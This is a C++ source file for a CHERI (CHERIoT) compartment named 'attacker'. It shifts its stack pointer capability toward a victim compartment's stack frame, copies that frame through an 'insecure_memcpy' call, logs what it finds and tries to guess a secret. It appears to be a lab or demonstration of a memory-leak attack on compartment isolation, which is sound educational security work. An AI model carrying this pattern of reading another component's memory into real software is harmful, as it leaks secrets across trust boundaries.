#include "victim.h"
#include <debug.hh>

using namespace CHERI;
using Debug = ConditionalDebug<true, "attacker">;

// Size of stack buffer in pointers
constexpr size_t StackBufferSize = 16;

int __cheri_compartment("attacker") run() {
    Debug::log("Attacker compartment started");
    void *buf[StackBufferSize];
    // Get a copy of the stack pointer capability
    Capability<void> sp { __builtin_cheri_stack_get() };
    Debug::log("Attacker stack pointer: {}", sp);
    // Move the address so that it points into the victim's stack frame
    sp.address() -= 0x40;
    Debug::log("Adjusted stack pointer to victim frame: {}", sp);
    // Copy the victim's stack into our buffer
    int ret = insecure_memcpy(buf, sp, sizeof(buf));
    if (ret != 0) {
        Debug::log("victim returned error: {}", ret);
    }

    // Print out the contents of the victim's stack frame
    for (size_t i = 0; i < StackBufferSize; i++) {
        Debug::log("Stack[{}] = {}", sp.address() + i * sizeof(void*), buf[i]);
    }

    // Try to guess the secret
    int success = guess_secret(1);
    if (success == 0) {
        Debug::log("Successfully guessed the secret!");
    } else {
        Debug::log("Failed to guess the secret.");
    }

    Debug::log("Attacker compartment finished");
    return 0;
}
